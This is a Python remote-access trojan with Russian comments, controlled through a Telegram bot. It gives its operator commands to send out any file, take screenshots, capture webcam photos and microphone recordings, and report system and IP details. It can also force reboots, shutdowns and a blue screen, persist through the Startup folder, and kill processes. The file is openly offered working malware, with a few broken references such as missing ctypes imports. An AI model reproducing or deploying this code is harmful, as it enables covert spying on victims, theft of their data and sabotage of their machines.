import telebot
import os
import requests
from PIL import ImageGrab
import shutil
import platform
import webbrowser
import subprocess
import cv2
import sys
import wave
import pyaudio

bot_token = "your-token"
adm = "your-chat-id"
bot = telebot.TeleBot(bot_token)

@bot.message_handler(commands=['start', 'help'])
def start(message):
	send_mess = """
	Выбирай:
	/direct - директория
	/ls - все файлы
	/cd - перейти в папку
	/download - скачать
	/screen - скриншот
	/check - Информация
	/photo - фотография с вебки
	/video - Видео с вебки 15 сек
	/audio - запись микрофона 15 сек
	/openurl - открыть ссылку
	/reboot - перезагрузка
	/powerOff - выключение
	/bsod - синий экран смерти
	/startup - добавить в автозагрузку
	/remove - удалить с компьютера
	/tasklist - список процессов
	/taskkill - убить процесс

	"""
	bot.send_message(adm, send_mess, parse_mode='html')

#директория
@bot.message_handler(commands=['direct', 'Direct']) 
def direct(command) :
    directory = os.path.abspath(os.getcwd())
    bot.send_message(adm, "Текущая дериктория: \n" + (str(directory)))

#все файлы
@bot.message_handler(commands=["ls", "Ls"]) 
def lsdir(commands):
 try:
     dirs = '\n'.join(os.listdir(path="."))
     bot.send_message(adm, "Files: " + "\n" + dirs)
 except:
     bot.send_message(adm, "Ошибка! файл введен неверно!")

#Инфо
@bot.message_handler(commands=['check', 'Check']) 
def send_info(command) :
    username = os.getlogin()
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version() 
    bot.send_message(adm, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
        "\nProcessor: " + processor + "\nVersion OS : " + systemali)

#Скриншот
@bot.message_handler(commands=['screen', 'Screen']) 
def send_screen(command) :
    bot.send_message(adm, "Подожди...") 
    screen = ImageGrab.grab() 
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') 
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') 
    files = {'photo': screen} 
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + adm , files=files) 

#сменить папку
@bot.message_handler(commands=["cd", "Cd"]) 
def cddir(message):
 try:
    user_msg = "{0}".format(message.text) 
    folder = user_msg.split(" ")[1]
    os.chdir(folder)
    bot.send_message(adm, "Директория изменена на " + folder)
 except:
     bot.send_message(adm, "Ошибка! Папка введена неправильно!")

#скачать файл
@bot.message_handler(commands =["Download", "download"])
def downloadfile(message):
 try:
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1] 
    doccc = {'document': open(docc,'rb')} 
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + adm , files=doccc) 
 except:
     bot.send_message(chat_id, "Ошибка! Файл введен неверно!")


#открыть ссылку
@bot.message_handler(commands=["openurl", "Openurl"]) 
def openurl(message):
 try:
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]
    webbrowser.open_new_tab(url)
    bot.send_message(adm, "Готово!")
 except:
        bot.send_message(adm, "Ошибка! ссылка введена неверно!")


#фото с вебки
@bot.message_handler(commands=['Photo', 'photo'])
def webcam(command):
 bot.send_chat_action(adm, 'upload_photo')
 try:
    cap = cv2.VideoCapture(0)
    for i in range(30):
       cap.read()
    ret, frame = cap.read()
    cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)   
    cap.release()
    webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
    bot.send_photo(adm, webcam)
    webcam.close()
    os.remove('C:\\ProgramData\\Webcam.jpg')
 except:
 	bot.send_message(adm, 'Камера не найдена')


#запись микрофона
@bot.message_handler(commands=['Audio', 'audio'])
def audio15(command):
 bot.send_message(adm, "Подожди...")
 bot.send_chat_action(adm, 'record_audio')
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = 15
 WAVE_OUTPUT_FILENAME = "C:\\ProgramData\\voice.wav"
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()
 voice = open("C:\\ProgramData\\voice.wav", "rb")
 bot.send_voice(adm, voice)
 voice.close()
 try:
 	os.remove("C:\\ProgramData\\voice.wav")
 except:
 	print('Error > Audio')

#перезагрузка
@bot.message_handler(commands=['Reboot', 'reboot'])
def reboot(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'Компьютер перезагружен')
 os.system('shutdown -r /t 0 /f')


#выключение
@bot.message_handler(commands=['PowerOff', 'PowerOff'])
def poweroff(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'Компьютер выключен')
 os.system('shutdown -s /t 0 /f')

#синий экран
@bot.message_handler(commands=['BSoD', 'bsod'])
def bsod(command):
 try:
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'BSoD Активирован')
    tmp1 = c_bool()
    tmp2 = DWORD()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
 except:
 	bot.send_message(adm, 'Error > BSoD')

#автозагрузка
@bot.message_handler(commands=['Startup', 'startup'])
def startup(commands):
 bot.send_chat_action(adm, 'typing')
 try:
  shutil.copy2((sys.argv[0]), r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
  bot.send_message(adm, '' + os.path.basename(sys.argv[0]) + ' скопирован в автозагрузку')
  os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
  bot.send_message(adm, '' + os.path.basename(sys.argv[0]) + ' запущен из автозагрузки')
  bot.send_message(adm, 'Завершаем текущий процесс...')
 except:
  bot.send_message(adm, 'Ошибка')
#удаление
@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
 try:
  shutil.move(sys.argv[0], 'C:\\ProgramData')
  bot.send_message(adm, '' + os.path.basename(sys.argv[0]) + ' удален с компьютера')
  bot.send_message(adm, 'Завершаем текущий процесс...')
  os.system('taskkill /im ' + os.path.basename(sys.argv[0]) + ' /f')
 except:
  bot.send_message(adm, 'Ошибка')

#список процессов
@bot.message_handler(commands=['Tasklist', 'tasklist'])
def tasklist(command):
 try:
  bot.send_chat_action(adm, 'upload_document')
  os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
  tasklist = open('C:\\ProgramData\\Tasklist.txt')
  bot.send_document(adm, tasklist)
  tasklist.close()
  os.remove('C:\\ProgramData\\Tasklist.txt')
 except:
  bot.send_message(adm, 'Error > Tasklist')

#убить процесс
@bot.message_handler(commands=['Taskkill', 'taskkill'])
def taskkill(message):
 try:
  bot.send_chat_action(adm, 'typing')
  user_msg = "{0}".format(message.text)
  subprocess.call("taskkill /f /im  " + user_msg.split(" ")[1] + '.exe')
  bot.send_message(adm, "Процесс " + user_msg.split(" ")[1] + " остановлен")
 except:
  bot.send_message(adm, 'Введите название процесса\n \n/Taskkill')

bot.polling()
